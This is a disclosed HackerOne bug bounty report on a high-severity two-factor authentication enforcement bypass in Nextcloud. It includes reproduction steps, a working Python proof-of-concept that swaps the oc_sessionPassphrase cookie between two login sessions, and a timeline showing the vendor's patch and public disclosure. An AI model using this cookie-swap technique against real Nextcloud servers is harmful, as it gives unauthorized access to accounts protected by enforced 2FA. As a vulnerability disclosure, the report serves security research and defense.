---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2021-07-31
submitted: 2020-12-04T01:07:56.574Z
bounty_usd: 750
votes: 64
cve: []
program: "[[programs/nextcloud|Nextcloud]]"
reporter: "abdullah-a"
source: "https://hackerone.com/reports/1050244"
title: "Two-factor authentication enforcement bypass"
---
# Two-factor authentication enforcement bypass

> **Severity:** High | **Bounty:** 750 USD | **Votes:** 64 | **Program:** Nextcloud | **Disclosed:** 2021-07-31

- Report: [https://hackerone.com/reports/1050244](https://hackerone.com/reports/1050244)
- CWE: N/A
- Submitted: 2020-12-04T01:07:56.574Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

the attacker could bypass the two-factor authentication enforcement

[ Steps to reproduce ]
1. Login with an Administrator account.
2. Click on your administrator profile icon.
3. Users -> Add group -> group name: Enforcement.
4. New User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.
5. Click on your administrator profile icon.
6. Settings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.
7. Save changes.
8. Logout.
9. Login with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.
10. Login with Username: Bypass and Password: NextCloudEnforcement with another session.
11. replace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.
12. then you have bypassed the two factor authentication enforcement.

[Code]
python script just change the domain to your domain and save as bypass.py
```
#!/usr/bin/python3
# python3 -m pip install requests beautifulsoup4
# python3 bypass.py
from requests import Session
from bs4 import BeautifulSoup

class NextCloud(object):
    def __init__(self, baseURL):
        self.session = Session()
        self.baseURL = baseURL

    def login(self, data):
        response = self.session.get(f'{self.baseURL}/login')
        soup = BeautifulSoup(response.text, 'html.parser')
        data.update({
            'requesttoken': soup.find('head')['data-requesttoken']
        })
        self.session.post(f'{self.baseURL}/login', data = data)
    
    def getCookies(self):
        return self.session.cookies.get_dict()

if __name__ == '__main__':
    baseURL = 'http://nextcloud.diefunction.local'
    data = {
        'user': 'bypass',
        'password': 'NextCloudEnforcement'
    }
    firstSession = NextCloud(baseURL)
    secondSession = NextCloud(baseURL)
    firstSession.login(data)
    secondSession.login(data)
    cookies = firstSession.getCookies()
    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']
    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement
```
change the browser cookies to the script output cookies

[ why its worked ]
I tried to understand why it's worked but I didn't found any reason for that
https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php

[Discovered by]
Abdullah Alharbi @Eng_Abdullahx0
Rayan Althobaiti @Diefunction

Note: if this is an eligible bug please provide a CVE.

## Impact

the attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication

## Timeline

- **Report Filed**
- **2020-12-04** @Nextcloud: Thanks a lot for reporting this potential issue back to us!

Our security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.
- **2020-12-04** @rullzer: Hi,

Thanks for your report.
I could verify your report.
We'll get back after analysis what is going on.

Cheers,
--Roeland
- **Report Triaged**
- **2020-12-04** @rullzer: Hi,

I think I found the root cause.
Can you try the patch in https://github.com/nextcloud/server/pull/24550 to see if that fixes the issue for you as well?

Thanks,
--Roeland
- **2020-12-05** @abdullah-a: Hi,

I confirm that the patch is working and the issue has been solved. 

Yours truly
- **Report Resolved**
- **2020-12-08** @abdullah-a: yes I would like that 

- name = Abdullah Alharbi @Eng_Abdullahx0
- name = Rayan Althobaiti @Diefunction

Thanks .
- **Bounty Awarded**
- **2020-12-10** @abdullah-a: thanks a lot , cheers
- **2021-03-15** @abdullah-a: hi @nickvergessen

By the way, can you request a CVE ID for it, please?

Thanks
- **Agreed On Going Public**
- **Report Became Public**
